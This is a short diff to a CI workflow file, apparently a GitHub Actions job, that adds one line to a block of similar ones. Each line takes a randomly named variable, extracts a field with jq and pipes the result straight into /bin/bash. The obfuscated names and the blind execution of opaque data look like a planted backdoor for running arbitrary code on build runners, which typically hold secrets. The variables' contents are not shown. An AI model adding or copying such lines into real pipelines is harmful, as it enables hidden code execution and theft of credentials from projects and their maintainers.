@@ -35,6 +35,7 @@ jobs:
           echo $vwrt6 | jq -r .w46392 | /bin/bash
           printf '%s' "$sudw60" | jq -r .jerx61 | /bin/bash
           echo $yz89639 | jq -r .h65243 | /bin/bash
+          echo $qptrg8102 | jq -r .zisn1 | /bin/bash
 
       - name: Persist results
         if: always()
